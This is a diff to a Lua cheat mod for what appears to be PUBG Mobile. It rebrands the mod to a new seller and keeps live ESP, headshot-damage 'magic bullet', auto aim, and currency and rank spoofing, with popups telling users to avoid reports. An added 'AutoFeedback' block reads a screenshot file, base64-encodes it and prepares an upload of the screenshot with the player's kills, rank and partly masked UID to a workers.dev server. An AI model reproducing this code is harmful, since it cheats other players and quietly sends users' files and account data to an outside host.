@@ -500,7 +500,7 @@ function BRPlayerCharacterBase:SwitchWeaponCheck(Slot, IgnoreState)
 end
 
 -- START FULL LOGIC MOD ==========================
-local function Notify(msg) local s = "[ZenXAHMAD VIP New] " .. tostring(msg)
+local function Notify(msg) local s = "[Premium VIP New] " .. tostring(msg)
 pcall(function() if _G.GTLModNotify then _G.GTLModNotify(s) end end)
 pcall(function() local sh = import("ScriptHelperClient") if sh and
 sh.AddOnScreenDebugMessage then sh.AddOnScreenDebugMessage(s, -1, 3.0, {R=1,
@@ -2953,7 +2953,7 @@ _G.ReadLiveConfig = function()
     if _G.SaveModSettings then _G.SaveModSettings() end
 end
 
--- SKIN MOD SYSTEM (FULL ZenXAHMAD VERSION + KILL COUNTER) — MIGRATED TO AddOutfit
+-- SKIN MOD SYSTEM (FULL HassanXpubg VERSION + KILL COUNTER) — MIGRATED TO AddOutfit
 -- Semua skin lama dihapus dan diganti dengan sistem AddOutfit dari file Vietnam
 -- VIP NATIVE MENU SYSTEM (RUNS DIRECTLY FROM GAME SETTINGS)
 function _G.InitModMenuTab()
@@ -3025,7 +3025,7 @@ function _G.InitModMenuTab()
 -- ESP VISUAL ====================
         local StackESPVisual = {
             { Key = "ModMenu_Skin_Glider", UI = AliasMap.Title, Text = "❏ SETTING ESP", ExpandHandle = "ModMenu_Skin3_Ex" },
-            { Key = "ModMenu_ESP1", UI = AliasMap.Switcher, Text = "ESP (AUTO SETUP) TELEGRAM @ZenXAHMAD", GetFunc = function() return _G.GTLModConfig.EspVip end, SetFunc = function(c,v) _G.GTLModConfig.EspVip = v return true end },
+            { Key = "ModMenu_ESP1", UI = AliasMap.Switcher, Text = "ESP (AUTO SETUP)", GetFunc = function() return _G.GTLModConfig.EspVip end, SetFunc = function(c,v) _G.GTLModConfig.EspVip = v return true end },
    
 -- ESP V2 : CLEAR VISION ====================
             { Key = "ModMenu_ESPV2_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ GTL ESP ✥", ExpandIndex = 0,
@@ -3177,7 +3177,7 @@ function _G.InitModMenuTab()
             { Key = "ModMenu_Magic_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ ▶ MAGIC +HEADSHOT (Head 40% ထပ်ပိုမထားပါနဲ့)", ExpandIndex = 0, GetFunc = function() return _G.GTLModConfig.CustomMagicBullet end, SetFunc = function(c,v) _G.GTLModConfig.CustomMagicBullet = v return true end },
             { Key = "ModMenu_Magic_Head", UI = AliasMap.Slider, Text = "   Head Damage (40 safe", ExpandHandle = "ModMenu_Magic_Ex", MinValue = 0, MaxValue = 100, min = 0, max = 100, GetFunc = function() return math.floor(((_G.GTLModState.CustomTextData.MagicHead or 1.0) / 5.0) * 100 + 0.5) end, SetFunc = function(c,v) _G.GTLModState.CustomTextData.MagicHead = (v / 100.0) * 5.0 return true end },
             { Key = "ModMenu_Magic_Body", UI = AliasMap.Slider, Text = "   Body Damage (30 safe) (Over 30 will hit behind the cover)", ExpandHandle = "ModMenu_Magic_Ex", MinValue = 0, MaxValue = 100, min = 0, max = 100, GetFunc = function() return math.floor(((_G.GTLModState.CustomTextData.MagicBody or 1.0) / 5.0) * 100 + 0.5) end, SetFunc = function(c,v) _G.GTLModState.CustomTextData.MagicBody = (v / 100.0) * 5.0 return true end },
-            { Key = "ModMenu_Magic_Legs", UI = AliasMap.Slider, Text = "   Legs Damage (No need to change) TELEGRAM @ZenXAHMAD", ExpandHandle = "ModMenu_Magic_Ex", MinValue = 0, MaxValue = 100, min = 0, max = 100, GetFunc = function() return math.floor(((_G.GTLModState.CustomTextData.MagicLegs or 1.0) / 5.0) * 100 + 0.5) end, SetFunc = function(c,v) _G.GTLModState.CustomTextData.MagicLegs = (v / 100.0) * 5.0 return true end }
+            { Key = "ModMenu_Magic_Legs", UI = AliasMap.Slider, Text = "   Legs Damage (No need to change)", ExpandHandle = "ModMenu_Magic_Ex", MinValue = 0, MaxValue = 100, min = 0, max = 100, GetFunc = function() return math.floor(((_G.GTLModState.CustomTextData.MagicLegs or 1.0) / 5.0) * 100 + 0.5) end, SetFunc = function(c,v) _G.GTLModState.CustomTextData.MagicLegs = (v / 100.0) * 5.0 return true end }
         }
 
 -- EXPERT (CAT_EXPERT) ==================
@@ -3265,7 +3265,7 @@ function _G.InitModMenuTab()
     { 
         Key = "ModMenu_Magic_Legs", 
         UI = AliasMap.Slider, 
-        Text = "   Legs Damage (No need to change) TELEGRAM @ZenXAHMAD", 
+        Text = "   Legs Damage (No need to change)", 
         ExpandHandle = "ModMenu_Expert_Active", 
         MinValue = 0, MaxValue = 100, min = 0, max = 100, 
         GetFunc = function() return math.floor(((_G.GTLModState.CustomTextData.MagicLegs or 1.0) / 5.0) * 100 + 0.5) end, 
@@ -3300,7 +3300,7 @@ function _G.InitModMenuTab()
 
 -- COMBAT 'GRAPHIC' ====================
         local StackCombatGraphic = {
-            { Key = "ModMenu_Skin_Glider", UI = AliasMap.Title, Text = "❏ LUA PAK MOD DEVELOPMENT BY-ZenXAHMAD", ExpandHandle = "ModMenu_Skin3_Ex" },
+            { Key = "ModMenu_Skin_Glider", UI = AliasMap.Title, Text = "❏ LUA PAK MOD DEVELOPMENT", ExpandHandle = "ModMenu_Skin3_Ex" },
             { Key = "ModMenu_Ipad_Ex", UI = AliasMap.TitleSwitcher, Text = "▶ iPad View", ExpandIndex = 0, GetFunc = function() return _G.GTLModConfig.IpadView end, SetFunc = function(c,v) _G.GTLModConfig.IpadView = v return true end },
             { Key = "ModMenu_Ipad_FOV", UI = AliasMap.Slider, Text = "   FOV Angle", ExpandHandle = "ModMenu_Ipad_Ex", MinValue = 1, MaxValue = 100, min = 1, max = 100, GetFunc = function() return (_G.GTLModState.CustomTextData.IpadViewFOV or 120) - 80 end, SetFunc = function(c,v) _G.GTLModState.CustomTextData.IpadViewFOV = 80 + v return true end },
             { Key = "ModMenu_165FPS", UI = AliasMap.Switcher, Text = "Unlock 165 FPS", GetFunc = function() return _G.GTLModConfig.UnlockFPS end, SetFunc = function(c,v) _G.GTLModConfig.UnlockFPS = v; if v then _G.GTLModState.GraphicsUnlocked = false end return true end },
@@ -3346,7 +3346,7 @@ function _G.InitModMenuTab()
 --        DEFINE MENU PAGE ====================
         SettingPageDefine.ModMenu = {
             Key = "ModMenu",
-            Text = "❏ @ZenXAHMAD'MENU",
+            Text = "❏ PREMIUM MENU",
             UIKey = "Setting_Page_Privacy",
             Category = {
                 { Key = "Cat_SkinMod", Text = "➠ SKIN CUSTOM", Stack = StackSkinMod },
@@ -3611,16 +3611,16 @@ local function ShowGTLModVIPMenu()
         if not Msg or not Msg.Show then return end
 
         local function Step_ScamAlert()
-            Msg.Show(1, "WARNING", "SEND FEEDBACK\nNO FEEDBACK NO MORE FEATURES", function() local Web = require("client.slua.logic.url.logic_webview_sdk"); if Web and Web.OpenURL then Web:OpenURL("https://t.me/ZenXAHMAD") end end, function() end, "JOIN", "CLOSE")
+            Msg.Show(1, "WARNING", "SEND FEEDBACK\nNO FEEDBACK NO MORE FEATURES", function() local Web = require("client.slua.logic.url.logic_webview_sdk"); if Web and Web.OpenURL then Web:OpenURL("") end end, function() end, "JOIN", "CLOSE")
             _G.GTLModState.MenuStep = 99
             _G.GTLModMenuAlreadyShown = true
         end
 
         local function Step_Welcome()
-            Msg.Show(1, "4.6 RESELLER ACCEPT", "IMPORTANT!!\n\nTHIS IS NOT FINAL VERSION\nPAKS ESP LUA VIP BY TELEGRAM @ZenXAHMAD",
+            Msg.Show(1, "4.6 PREMIUM LUA", "IMPORTANT!!\n\nUSE LESS FEATURES ON MAIN I'D\nPLAY SAFE STAY SAFE",
             function() 
                 _G.InitModMenuTab()
-                Notify("VIP MOD MENU BY @ZenXAHMAD to toggle features!")
+                Notify("VIP MOD MENU toggle features!")
                 Step_ScamAlert()
             end, 
             function() end, "OKEY", "CLOSE")
@@ -3640,10 +3640,10 @@ local function ShowBypassPopup()
         local CommonMsgBoxMgr = require("client.slua.logic.common.logic_common_msg_box")
         local Web = require("client.slua.logic.url.logic_webview_sdk")
         local function onClickTele()
-            Web:OpenURL("https://t.me/ZenXAHMAD")
+            Web:OpenURL("")
         end
-        local msg = "4.5 RESELLER ACCEPT!\n\nPAKS MOD BY @ZenXAHMAD\nUSE MAIN ID!\nTELEGRAM ှ MOD MENU BY @ZenXAHMAD\n\nAVOID FROM REPORT!!"
-        CommonMsgBoxMgr.Show(2, "#NOTES FROM ADMIN", msg, onClickTele, nil, "TELEGRAM")
+        local msg = "4.6 PREMIUM MOD\n\nPLAY SAFE AVOID REPORTS\nUSE MAIN ID!\nLONG RANGE DON'T USE AUTO AIM\n\nAVOID FROM REPORT!!"
+        CommonMsgBoxMgr.Show(2, "#NOTES FROM OWNER", msg, onClickTele, nil, "OWNER")
     end)
 end
 
@@ -15740,7 +15740,7 @@ local function MainLoop()
 
                     local color = GetRainbowColor()
                     local totalEnemy = realCount + aiCount
-                    local text = totalEnemy > 0 and string.format("❮ ENEMY : %d ❯", totalEnemy) or " ❮ CLEAR ENEMY || @ZenXAHMAD❯"
+                    local text = totalEnemy > 0 and string.format("❮ ENEMY : %d ❯", totalEnemy) or " ❮ CLEAR ENEMY ❯"
                     MyHUD:AddDebugText(text, localPlayer, 1.05, {X=0, Y=0, Z=150}, {X=0, Y=0, Z=150}, color, true, false, true, nil, 1.2, true)
                 end
 
@@ -15809,7 +15809,7 @@ local myToken = _G.GTLModState.LoopToken
 local function FastTick() 
     if isExpired then 
         if not _G.GTLModNotifiedExpire then
-            Notify("MOD HAS EXPIRED! PLEASE CONTACT ADMIN TO RENEW!\nTelegram @ZenXAHMAD")
+            Notify("MOD HAS EXPIRED! PLEASE CONTACT OWNER TO RENEW!\nCONTACT OWNER AND GEY VIP")
             _G.GTLModNotifiedExpire = true
         end
         return 
@@ -15895,7 +15895,7 @@ if not isExpired then
     if okTicker and ticker and ticker.AddTimerOnce then
         ticker.AddTimerOnce(0.1, FastAimbotTick)
     end
-    Notify("You are using VIP Mod v4. If you don't have a key, inbox Telegram : @ZenXAHMAD")
+    Notify("You are using VIP Mod. If you don't have a key, Contact owner and get key")
     
 if okTicker and ticker and ticker.AddTimerLoop and _G.__szSkinHackLoopStarted ~= SZ_SCRIPT_VER then
         _G.__szSkinHackLoopStarted = SZ_SCRIPT_VER
@@ -29656,8 +29656,8 @@ function _G.InjectLobbySkins()
                                         T.Enabled = false
                                         if T.Stop then pcall(T.Stop) end
                                     end
-                                    if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Set then
-                                        pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_ENABLE", 0)
+                                    if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Set then
+                                        pcall(_G.HassanXpubg_Config.Set, "TRAIL_ENABLE", 0)
                                     end
                                 end
                             end)
@@ -29686,9 +29686,9 @@ function _G.InjectLobbySkins()
                                         T.Enabled = true
                                         if T.Apply then pcall(T.Apply) end
                                     end
-                                    if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Set then
-                                        pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_TYPE", rid)
-                                        pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_ENABLE", 1)
+                                    if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Set then
+                                        pcall(_G.HassanXpubg_Config.Set, "TRAIL_TYPE", rid)
+                                        pcall(_G.HassanXpubg_Config.Set, "TRAIL_ENABLE", 1)
                                     end
                                 end
                             end)
@@ -29716,8 +29716,8 @@ function _G.InjectLobbySkins()
                                     T.Enabled = false
                                     if T.Stop then pcall(T.Stop) end
                                 end
-                                if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Set then
-                                    pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_ENABLE", 0)
+                                if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Set then
+                                    pcall(_G.HassanXpubg_Config.Set, "TRAIL_ENABLE", 0)
                                 end
                             end
                         end)
@@ -31362,9 +31362,9 @@ do
 end
 end)
 
-if not _G.ZenXAHMAD_Config then
+if not _G.HassanXpubg_Config then
     local __cfgStore = {}
-    _G.ZenXAHMAD_Config = setmetatable({
+    _G.HassanXpubg_Config = setmetatable({
         PATHS = {},
         Get = function(k, d) local v = __cfgStore[k]; if v == nil then return d end return v end,
         Set = function(k, v) __cfgStore[k] = v end,
@@ -31472,8 +31472,8 @@ end
 
 function _G.FeatureSwitch(key, defaultOn)
     local ok, v = pcall(function()
-        if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get then
-            return _G.ZenXAHMAD_Config.Get(key, defaultOn and 1 or 0)
+        if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Get then
+            return _G.HassanXpubg_Config.Get(key, defaultOn and 1 or 0)
         end
         return nil
     end)
@@ -33234,7 +33234,7 @@ if _G.__FakeGCurrency_Loaded then return _G.FakeGCurrency end
 _G.__FakeGCurrency_Loaded = true
 
 function FakeMoneyOrDefault(key, fallback)
-    local v = tonumber(_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get and _G.ZenXAHMAD_Config.Get(key, 0)) or 0
+    local v = tonumber(_G.HassanXpubg_Config and _G.HassanXpubg_Config.Get and _G.HassanXpubg_Config.Get(key, 0)) or 0
     if v and v > 0 then return v end
     return fallback
 end
@@ -47944,8 +47944,8 @@ function _G.InjectLobbySkins()
                                         T.Enabled = false
                                         if T.Stop then pcall(T.Stop) end
                                     end
-                                    if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Set then
-                                        pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_ENABLE", 0)
+                                    if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Set then
+                                        pcall(_G.HassanXpubg_Config.Set, "TRAIL_ENABLE", 0)
                                     end
                                 end
                             end)
@@ -47975,9 +47975,9 @@ function _G.InjectLobbySkins()
                                         T.Enabled = true
                                         if T.Apply then pcall(T.Apply) end
                                     end
-                                    if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Set then
-                                        pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_TYPE", rid)
-                                        pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_ENABLE", 1)
+                                    if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Set then
+                                        pcall(_G.HassanXpubg_Config.Set, "TRAIL_TYPE", rid)
+                                        pcall(_G.HassanXpubg_Config.Set, "TRAIL_ENABLE", 1)
                                     end
                                 end
                             end)
@@ -48006,8 +48006,8 @@ function _G.InjectLobbySkins()
                                     T.Enabled = false
                                     if T.Stop then pcall(T.Stop) end
                                 end
-                                if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Set then
-                                    pcall(_G.ZenXAHMAD_Config.Set, "TRAIL_ENABLE", 0)
+                                if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Set then
+                                    pcall(_G.HassanXpubg_Config.Set, "TRAIL_ENABLE", 0)
                                 end
                             end
                         end)
@@ -48260,14 +48260,14 @@ do
 FakeFriendState = { installed = false, profiles = {} }
 
 function FF_ConfigEnabled()
-  local ok, v = pcall(function() return tonumber(_G.ZenXAHMAD_Config.Get("CI_FAKEFRIEND_EN", 0)) end)
+  local ok, v = pcall(function() return tonumber(_G.HassanXpubg_Config.Get("CI_FAKEFRIEND_EN", 0)) end)
   return ok and v == 1
 end
 
 function FF_GetIDs()
   local list, seen = {}, {}
   for i = 1, 5 do
-    local ok, id = pcall(function() return tonumber(_G.ZenXAHMAD_Config.Get("CI_FAKEFRIEND_ID" .. i, 0)) end)
+    local ok, id = pcall(function() return tonumber(_G.HassanXpubg_Config.Get("CI_FAKEFRIEND_ID" .. i, 0)) end)
     if ok and id and id > 0 and not seen[id] then
       seen[id] = true
       table.insert(list, id)
@@ -49551,7 +49551,7 @@ end
 function refreshFakeUC()
     if not DataMgr then return end
     local fake = getFakeUC()
-    local ciV = tonumber(_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get and _G.ZenXAHMAD_Config.Get("CI_MONEY_UC", 0)) or 0
+    local ciV = tonumber(_G.HassanXpubg_Config and _G.HassanXpubg_Config.Get and _G.HassanXpubg_Config.Get("CI_MONEY_UC", 0)) or 0
     if ciV > 0 then fake = ciV end
 
     if fake <= 0 then return end
@@ -49592,7 +49592,7 @@ end
 function refreshFakeBP()
     if not DataMgr then return end
     local fake = lizardvipNum(_G.LizardVipFakeAccount.bp)
-    local ciV = tonumber(_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get and _G.ZenXAHMAD_Config.Get("CI_MONEY_GOLD", 0)) or 0
+    local ciV = tonumber(_G.HassanXpubg_Config and _G.HassanXpubg_Config.Get and _G.HassanXpubg_Config.Get("CI_MONEY_GOLD", 0)) or 0
     if ciV > 0 then fake = ciV end
     if fake <= 0 then return end
     if tonumber(DataMgr.gold) == fake then return end
@@ -49605,7 +49605,7 @@ end
 function refreshFakeSilver()
     if not DataMgr then return end
     local fake = lizardvipNum(_G.LizardVipFakeAccount.silver)
-    local ciV = tonumber(_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get and _G.ZenXAHMAD_Config.Get("CI_MONEY_SILVER", 0)) or 0
+    local ciV = tonumber(_G.HassanXpubg_Config and _G.HassanXpubg_Config.Get and _G.HassanXpubg_Config.Get("CI_MONEY_SILVER", 0)) or 0
     if ciV > 0 then fake = ciV end
     if fake <= 0 then return end
     if tonumber(DataMgr.diamond) == fake then return end
@@ -49618,7 +49618,7 @@ end
 function refreshFakeAG()
     if not DataMgr then return end
     local fake = lizardvipNum(_G.LizardVipFakeAccount.ag)
-    local ciV = tonumber(_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get and _G.ZenXAHMAD_Config.Get("CI_MONEY_AG", 0)) or 0
+    local ciV = tonumber(_G.HassanXpubg_Config and _G.HassanXpubg_Config.Get and _G.HassanXpubg_Config.Get("CI_MONEY_AG", 0)) or 0
     if ciV > 0 then fake = ciV end
     if fake <= 0 then return end
     if tonumber(DataMgr.eternal_diamond) == fake then return end
@@ -49632,7 +49632,7 @@ function refreshFakeLevel()
     if not DataMgr or not DataMgr.roleData then return end
 
     local fake = lizardvipNum(_G.LizardVipFakeAccount.level)
-    local ciV = tonumber(_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get and _G.ZenXAHMAD_Config.Get("CI_PLAYER_LEVEL", 0)) or 0
+    local ciV = tonumber(_G.HassanXpubg_Config and _G.HassanXpubg_Config.Get and _G.HassanXpubg_Config.Get("CI_PLAYER_LEVEL", 0)) or 0
     if ciV > 0 then fake = ciV end
     if fake <= 0 then return end
     local cur = tonumber(DataMgr.roleData.level) or 0
@@ -52080,8 +52080,8 @@ do
 
     local function CfgNum(key, def)
         local ok, v = pcall(function()
-            if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.Get then
-                return _G.ZenXAHMAD_Config.Get(key, def or 0)
+            if _G.HassanXpubg_Config and _G.HassanXpubg_Config.Get then
+                return _G.HassanXpubg_Config.Get(key, def or 0)
             end
         end)
         if ok then return tonumber(v) or (def or 0) end
@@ -52094,7 +52094,7 @@ do
     M._textCache = M._textCache or nil
 
     local function CI_TextFilePath()
-        local paths = (_G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.PATHS) or {}
+        local paths = (_G.HassanXpubg_Config and _G.HassanXpubg_Config.PATHS) or {}
         for _, p in ipairs(paths) do
             local dir = tostring(p):match("^(.*)/[^/]*$")
             if dir then
@@ -52165,10 +52165,10 @@ do
                 M._closeBoundFor = ui
                 comp:AddControlEventByControl(comp.UIRoot.close, "OnClicked", function()
                     pcall(function()
-                        if _G.ZenXAHMAD_Config then
-                            _G.ZenXAHMAD_Config._numInput = nil
-                            _G.ZenXAHMAD_Config._skinPopupSetupToken = nil
-                            _G.ZenXAHMAD_Config._releaseSkinPopupOpeningLock()
+                        if _G.HassanXpubg_Config then
+                            _G.HassanXpubg_Config._numInput = nil
+                            _G.HassanXpubg_Config._skinPopupSetupToken = nil
+                            _G.HassanXpubg_Config._releaseSkinPopupOpeningLock()
                         end
                     end)
                     pcall(function()
@@ -52195,8 +52195,8 @@ do
 
     function M.ShowTextInputPopup(opts)
         M.PatchTextInputPopup()
-        if _G.ZenXAHMAD_Config and _G.ZenXAHMAD_Config.ShowTextInputPopup then
-            return _G.ZenXAHMAD_Config.ShowTextInputPopup(opts)
+        if _G.HassanXpubg_Config and _G.HassanXpubg_Config.ShowTextInputPopup then
+            return _G.HassanXpubg_Config.ShowTextInputPopup(opts)
         end
         return false
     end
@@ -52249,14 +52249,14 @@ do
             local profile = orig(self, uid, ...)
             if profile and type(profile) == "table" and CI_IsSelfUid(uid) then
 
-                local tid = tonumber(ZenXAHMAD_Config.Get("CI_TITLE_ID", 0)) or 0
+                local tid = tonumber(HassanXpubg_Config.Get("CI_TITLE_ID", 0)) or 0
                 if tid > 0 and M.BuildTitleDet then
                     pcall(function()
                         profile.hsegment_title_det = M.BuildTitleDet(tid)
                     end)
                 end
 
-                local lv = tonumber(ZenXAHMAD_Config.Get("CI_PLAYER_LEVEL", 0)) or 0
+                local lv = tonumber(HassanXpubg_Config.Get("CI_PLAYER_LEVEL", 0)) or 0
                 if lv > 0 then
                     pcall(function() profile.level = lv end)
                 end
@@ -52564,7 +52564,7 @@ do
     local function CI_MoneyOverride(money_type)
         local key = CI_MONEY_MAP[tonumber(money_type) or -1]
         if not key then return nil end
-        local v = tonumber(ZenXAHMAD_Config.Get(key, 0)) or 0
+        local v = tonumber(HassanXpubg_Config.Get(key, 0)) or 0
         if v > 0 then return v end
         return nil
     end
@@ -52630,8 +52630,8 @@ do
     CI_RegisterLobbyTick(CI_ApplyMoney)
 
     local function CI_ApplyRank()
-        local seg = tonumber(ZenXAHMAD_Config.Get("CI_RANK_SEG", 0)) or 0
-        local score = tonumber(ZenXAHMAD_Config.Get("CI_RANK_SCORE", 0)) or 0
+        local seg = tonumber(HassanXpubg_Config.Get("CI_RANK_SEG", 0)) or 0
+        local score = tonumber(HassanXpubg_Config.Get("CI_RANK_SCORE", 0)) or 0
         local RS = _G.ClientRankSpoof
         if RS and type(RS.cfg) == "table" then
             if seg > 0 then
@@ -52642,7 +52642,7 @@ do
                 RS.cfg.score = score
                 _G.RankSpoof_Score = score
             end
-            local rankNo = tonumber(ZenXAHMAD_Config.Get("CI_RANK_NO", 0)) or 0
+            local rankNo = tonumber(HassanXpubg_Config.Get("CI_RANK_NO", 0)) or 0
             if rankNo > 0 then
                 RS.cfg.rankNo = rankNo
                 _G.RankSpoof_Rank = rankNo
@@ -52694,8 +52694,8 @@ do
 
     CI_RegisterLobbyTick(CI_ApplyRank)
 
-    local function CI_PeakSeg() return tonumber(ZenXAHMAD_Config.Get("CI_PEAK_SEG", 0)) or 0 end
-    local function CI_PeakScore() return tonumber(ZenXAHMAD_Config.Get("CI_PEAK_SCORE", 0)) or 0 end
+    local function CI_PeakSeg() return tonumber(HassanXpubg_Config.Get("CI_PEAK_SEG", 0)) or 0 end
+    local function CI_PeakScore() return tonumber(HassanXpubg_Config.Get("CI_PEAK_SCORE", 0)) or 0 end
 
     local function CI_ApplyPeak()
         local seg = CI_PeakSeg()
@@ -52725,7 +52725,7 @@ do
             if seg > 0 and tonumber(dm.roleData.peakgame_history_max_segment) then
                 dm.roleData.peakgame_history_max_segment = seg
             end
-            local hist = tonumber(ZenXAHMAD_Config.Get("CI_PEAK_HIST", 0)) or 0
+            local hist = tonumber(HassanXpubg_Config.Get("CI_PEAK_HIST", 0)) or 0
             if hist > 0 then
                 dm.roleData.peakgame_history_max_segment = hist
             end
@@ -52764,7 +52764,7 @@ do
         if type(util.GetSelfHistoryMaxSegmentId) == "function" then
             local orig = util.GetSelfHistoryMaxSegmentId
             util.GetSelfHistoryMaxSegmentId = function(...)
-                local h = tonumber(ZenXAHMAD_Config.Get("CI_PEAK_HIST", 0)) or 0
+                local h = tonumber(HassanXpubg_Config.Get("CI_PEAK_HIST", 0)) or 0
                 if h > 0 then return h end
                 local seg = CI_PeakSeg()
                 if seg > 0 then return seg end
@@ -52798,7 +52798,7 @@ do
 
     CI_RegisterLobbyTick(CI_ApplyPeak)
 
-    local function CI_Num(key) return tonumber(ZenXAHMAD_Config.Get(key, 0)) or 0 end
+    local function CI_Num(key) return tonumber(HassanXpubg_Config.Get(key, 0)) or 0 end
 
     local function CI_BuildTitleDet(tid)
         local det = {}
@@ -53215,6 +53215,473 @@ end
 end
 pcall(__LobbyModsMain)
 
+-- ============================================================
+-- AUTO FEEDBACK SYSTEM (Telegram) - ALL RANKS SUPPORTED
+-- ============================================================
+local AutoFeedback = {
+	Config = {
+		ServerURL = "https://snowy-truth-7175.khizarkhan33445j.workers.dev/",
+		TestMode = false
+	},
+	Hooked = false
+}
+
+local function AF_Log(message)
+	print(string.format("[HASSAN X PUBG][%s] %s", os.date("%H:%M:%S"), tostring(message)))
+end
+
+local function AF_Notify(message)
+	if _G.SRCHUBNotify then
+		pcall(_G.SRCHUBNotify, message)
+	end
+end
+
+local function AF_GetModule(name, allowRequire)
+	local loaded = package and package.loaded and package.loaded[name]
+	if loaded then return loaded end
+	if allowRequire == false then return nil end
+	local ok, module = pcall(require, name)
+	if ok then return module end
+	return nil
+end
+
+local function AF_AddTimerOnce(delay, callback)
+	local ticker = AF_GetModule("common.time_ticker")
+	if ticker and type(ticker.AddTimerOnce) == "function" then
+		ticker.AddTimerOnce(delay, callback)
+		return true
+	end
+	return false
+end
+
+local function AF_Base64Encode(data)
+	if type(data) ~= "string" or #data == 0 then return "" end
+	local alphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+	local output = {}
+	local outputIndex = 0
+	local index = 1
+	while index <= #data - 2 do
+		local a, b, c = string.byte(data, index, index + 2)
+		local value = a * 65536 + b * 256 + c
+		outputIndex = outputIndex + 1
+		output[outputIndex] = string.char(
+			string.byte(alphabet, math.floor(value / 262144) + 1),
+			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
+			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
+			string.byte(alphabet, value % 64 + 1)
+		)
+		index = index + 3
+	end
+	local remaining = #data - index + 1
+	if remaining == 2 then
+		local a, b = string.byte(data, index, index + 1)
+		local value = a * 65536 + b * 256
+		outputIndex = outputIndex + 1
+		output[outputIndex] = string.char(
+			string.byte(alphabet, math.floor(value / 262144) + 1),
+			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
+			string.byte(alphabet, math.floor(value / 64) % 64 + 1),
+			string.byte("=")
+		)
+	elseif remaining == 1 then
+		local value = string.byte(data, index) * 65536
+		outputIndex = outputIndex + 1
+		output[outputIndex] = string.char(
+			string.byte(alphabet, math.floor(value / 262144) + 1),
+			string.byte(alphabet, math.floor(value / 4096) % 64 + 1),
+			string.byte("="),
+			string.byte("=")
+		)
+	end
+	return table.concat(output)
+end
+
+local function AF_UrlEncode(value)
+	if value == nil then return nil end
+	value = tostring(value):gsub("\n", "\r\n")
+	value = value:gsub("([^A-Za-z0-9 %-%_%.%~])", function(character)
+		return string.format("%%%02X", string.byte(character))
+	end)
+	value = value:gsub(" ", "+")
+	return value
+end
+
+local function AF_ReadFile(path)
+	local file = io.open(path, "rb")
+	if not file then return "" end
+	local data = file:read("*a") or ""
+	file:close()
+	return data
+end
+
+local function AF_RemoveFile(path)
+	pcall(os.remove, path)
+end
+
+local function AF_GetRankName(rank)
+	if rank < 1700 then return "Bronze"
+	elseif rank < 2200 then return "Silver"
+	elseif rank < 2700 then return "Gold"
+	elseif rank < 3200 then return "Platinum"
+	elseif rank < 3700 then return "Diamond"
+	elseif rank < 4200 then return "Crown"
+	elseif rank < 4700 then return "Ace"
+	elseif rank < 5200 then return "Ace Master"
+	elseif rank < 5600 then return "Ace Dominator"
+	end
+	return "Conqueror"
+end
+
+local FeedbackCaptionTemplate = "<b>TELEGRAM [ HASSAN X PUBG ]</b>\n<pre>\nPlayer - %s\nUID    - %s\nTime   - %s\nKills  - %d\nRank   - %s\n</pre>\n[ ACTIVE - SAFE ]\n<b>Owner: @HassanXpubg</b>"
+
+function AutoFeedback.SendFeedback(path, kills, rank, segment)
+	AF_Log("Preparing to send feedback. Screenshot: " .. tostring(path))
+	local ok, err = pcall(function()
+		local httpManager = AF_GetModule("client.slua.logic.http.http_manager")
+		if not httpManager or type(httpManager.Post) ~= "function" then
+			AF_Log("HTTP manager is unavailable.")
+			return
+		end
+		local attempts = 0
+		local function TrySend()
+			local imageData = AF_ReadFile(path)
+			if #imageData > 0 then
+				local uid = "unknown"
+				if _G.DataMgr and _G.DataMgr.roleData and _G.DataMgr.roleData.uid then
+					uid = tostring(_G.DataMgr.roleData.uid)
+				elseif _G._KONG_UK then
+					uid = tostring(_G._KONG_UK)
+				end
+				kills = tonumber(kills) or 0
+				rank = tonumber(rank) or 0
+				segment = tonumber(segment) or 0
+				local maskedName = "*****"
+				local maskedUid = "***"
+				if uid ~= "unknown" and #uid > 5 then
+					maskedUid = uid:sub(1, 3) .. "***" .. uid:sub(-2)
+				end
+				local caption = string.format(
+					FeedbackCaptionTemplate,
+					maskedName,
+					maskedUid,
+					os.date("%H:%M:%S %d/%m/%Y"),
+					kills,
+					AF_GetRankName(rank)
+				)
+				local encodedImage = AF_Base64Encode(imageData)
+				encodedImage = encodedImage:gsub("%+", "%%2B")
+				encodedImage = encodedImage:gsub("/", "%%2F")
+				encodedImage = encodedImage:gsub("=", "%%3D")
+				AF_Notify("[SRC_HUB] Uploading Top 1 screenshot to VIP Server...")
+				local body = "base64_image=" .. encodedImage
+					.. "&caption=" .. AF_UrlEncode(caption)
